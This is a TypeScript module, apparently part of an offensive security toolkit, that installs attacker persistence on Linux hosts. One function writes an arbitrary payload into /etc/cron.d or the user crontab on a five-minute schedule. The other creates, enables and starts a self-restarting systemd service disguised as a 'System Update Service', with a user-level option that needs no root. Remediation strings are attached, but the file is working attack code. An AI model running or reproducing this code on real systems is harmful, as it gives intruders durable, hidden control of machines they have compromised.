import { bash, sh, activeExec, argVal, hasFlag } from "./shared"
import type { Finding, HookResult } from "./shared"

export async function cronPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Cron Persistence ==="]
  const payload = argVal(args, "--payload")
  const schedule = argVal(args, "--schedule") || "*/5 * * * *"

  const script = `
echo "--- Current Cron Jobs ---"
crontab -l 2>/dev/null && echo "[*] User crontab exists" || echo "[-] No user crontab"
echo ""
echo "--- System Cron ---"
ls -la /etc/cron.d/ 2>/dev/null
echo ""
echo "--- Cron Directories ---"
for d in /etc/cron.hourly /etc/cron.daily /etc/cron.weekly /etc/cron.monthly; do
  if [ -d "$d" ]; then
    count=$(ls -1 "$d" 2>/dev/null | wc -l)
    writable=$([ -w "$d" ] && echo "WRITABLE" || echo "read-only")
    echo "$d: $count scripts ($writable)"
  fi
done
echo ""
echo "--- /etc/crontab ---"
cat /etc/crontab 2>/dev/null
echo ""
${payload ? `
echo "--- Installing Cron Persistence ---"
if [ -w /etc/cron.d/ ]; then
  echo "${schedule} root ${payload}" > /etc/cron.d/cs_persist 2>/dev/null && echo "[+] Written to /etc/cron.d/cs_persist" || echo "[-] Failed to write to /etc/cron.d/"
elif command -v crontab >/dev/null 2>&1; then
  (crontab -l 2>/dev/null; echo "${schedule} ${payload}") | crontab - 2>/dev/null && echo "[+] Added to user crontab" || echo "[-] Failed to add to user crontab"
else
  echo "[-] No writable cron location found"
fi
` : `echo "[*] Dry run — pass --payload <cmd> to install. Use --schedule for timing (default: */5 * * * *)"
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+]")) {
    findings.push({
      checkId: "LNX-CRONP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: "cron",
      title: "Cron persistence installed",
      details: `Cron job persistence established with schedule: ${schedule}`,
      remediation: "Audit crontab, /etc/cron.d/, and cron.{hourly,daily,weekly,monthly} directories. Remove unauthorized entries.",
    })
  }

  const writable = (r.stdout.match(/WRITABLE/g) || []).length
  if (writable > 0) {
    findings.push({
      checkId: "LNX-CRONP-002",
      provider: "linuxhook",
      severity: "MEDIUM",
      status: "IDENTIFIED",
      resource: "cron_dirs",
      title: "Writable cron directories found",
      details: `${writable} cron directory/directories are writable — persistence can be established`,
      remediation: "Restrict cron directory permissions to root only (755 with root ownership).",
    })
  }

  return { output: output.join("\n"), findings }
}

export async function systemdPersist(args: string[], timeout: number): Promise<HookResult> {
  const findings: Finding[] = []
  const output: string[] = ["=== Systemd Persistence ==="]
  const payload = argVal(args, "--payload")
  const name = argVal(args, "--name") || "cs-update"
  const userLevel = hasFlag(args, "--user")

  const script = `
echo "--- Init System Check ---"
if [ -d /run/systemd/system ]; then
  echo "[+] systemd is the init system"
else
  echo "[-] systemd is NOT running — this persistence method will not work"
  exit 1
fi
echo ""
echo "--- Existing Custom Services ---"
${userLevel ? `
ls -la ~/.config/systemd/user/ 2>/dev/null || echo "[-] No user services directory"
systemctl --user list-units --type=service --no-pager 2>/dev/null | head -20
` : `
find /etc/systemd/system/ -maxdepth 1 -name "*.service" -newer /etc/systemd/system 2>/dev/null | head -20
systemctl list-units --type=service --state=running --no-pager 2>/dev/null | head -30
`}
echo ""
${payload ? `
echo "--- Installing Systemd Persistence ---"
${userLevel ? `
mkdir -p ~/.config/systemd/user 2>/dev/null
cat > ~/.config/systemd/user/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=default.target
UNIT
systemctl --user daemon-reload 2>/dev/null
systemctl --user enable ${name}.service 2>/dev/null && echo "[+] User service enabled: ${name}.service" || echo "[-] Failed to enable user service"
systemctl --user start ${name}.service 2>/dev/null && echo "[+] User service started" || echo "[-] Failed to start user service"
` : `
cat > /etc/systemd/system/${name}.service << 'UNIT'
[Unit]
Description=System Update Service
After=network.target

[Service]
Type=simple
ExecStart=${payload}
Restart=on-failure
RestartSec=60

[Install]
WantedBy=multi-user.target
UNIT
systemctl daemon-reload 2>/dev/null
systemctl enable ${name}.service 2>/dev/null && echo "[+] Service enabled: ${name}.service" || echo "[-] Failed to enable service"
systemctl start ${name}.service 2>/dev/null && echo "[+] Service started" || echo "[-] Failed to start service"
`}
` : `echo "[*] Dry run — pass --payload <cmd> --name <svc-name> to install. Add --user for user-level service."
`}
`

  const r = activeExec === "sh" ? await sh(script, timeout) : await bash(script, timeout)
  output.push(r.stdout || r.stderr)

  if (r.stdout.includes("[+] Service enabled") || r.stdout.includes("[+] User service enabled")) {
    findings.push({
      checkId: "LNX-SYSDP-001",
      provider: "linuxhook",
      severity: "HIGH",
      status: "INSTALLED",
      resource: `systemd/${name}.service`,
      title: `Systemd ${userLevel ? "user " : ""}service persistence installed`,
      details: `Service ${name}.service created and enabled${userLevel ? " at user level (no root needed)" : " at system level"}. Restarts on failure with 60s delay.`,
      remediation: `Remove with: systemctl ${userLevel ? "--user " : ""}disable --now ${name}.service && rm ${userLevel ? "~/.config/systemd/user" : "/etc/systemd/system"}/${name}.service`,
    })
  }

  return { output: output.join("\n"), findings }
}
